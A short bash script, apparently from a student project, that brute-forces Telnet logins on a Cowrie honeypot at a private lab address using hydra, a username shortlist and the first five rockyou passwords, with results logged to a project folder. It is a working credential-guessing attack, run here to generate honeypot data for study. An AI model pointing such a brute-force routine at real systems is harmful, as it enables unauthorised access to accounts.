#!/bin/bash
# Telnet brute force - targets Cowrie

COWRIE="172.16.0.20"
LOGDIR="/home/kali/Desktop/fyp/attack_scripts/logs/brute_force"
USERS="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
ROCKYOU="/usr/share/wordlists/rockyou.txt"

mkdir -p "$LOGDIR"
head -5 "$ROCKYOU" > /tmp/telnet_pass_5.txt

echo "Telnet brute force on $COWRIE"

if nc -zw2 "$COWRIE" 23 2>/dev/null; then
    timeout 600 hydra -L "$USERS" -P /tmp/telnet_pass_5.txt -t 4 -o "$LOGDIR/telnet_${COWRIE}.txt" telnet://$COWRIE 2>/dev/null
else
    echo "Telnet not open"
fi

echo "Done"
